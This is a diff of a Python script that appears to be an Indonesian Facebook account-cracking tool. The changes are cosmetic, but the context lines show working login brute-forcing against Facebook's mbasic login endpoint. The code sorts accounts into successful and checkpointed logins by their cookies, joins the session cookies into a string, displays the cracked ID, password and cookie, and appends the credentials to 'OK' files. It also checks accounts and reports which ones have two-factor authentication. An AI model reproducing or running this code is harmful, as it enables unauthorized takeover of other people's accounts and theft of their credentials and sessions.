@@ -1111,7 +1111,6 @@ def reguler(idf,pwv,awal):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
-				print('')
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
@@ -1124,14 +1123,13 @@ def reguler(idf,pwv,awal):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print('')
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
 				prints(tree)
 				os.popen('play-audio o.mp3')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(kuki)
 				break
 			else:continue
@@ -1449,7 +1447,7 @@ def mengecek(user,pw):
 					prints(tree)
 					open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print(Panel("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M)))
+				print(Panel("\r%s \033[0m akun terpasang autentikasi dua faktor			"%(M)))
 			else:
 				print("%s%s\033[0mterjadi kesalahan"%(M,til))
 		else:
@@ -1464,7 +1462,7 @@ def mengecek(user,pw):
 		print("%s %s"%(M,oh))
 	else:
 		tree = Tree(" ",guide_style=f"bold white")
-		tree.add(Panel(f"login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"bold white"))
+		tree.add(Panel(f"login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"{color_panel}"))
 		prints(tree)
 		  
 def scarpping_ua():
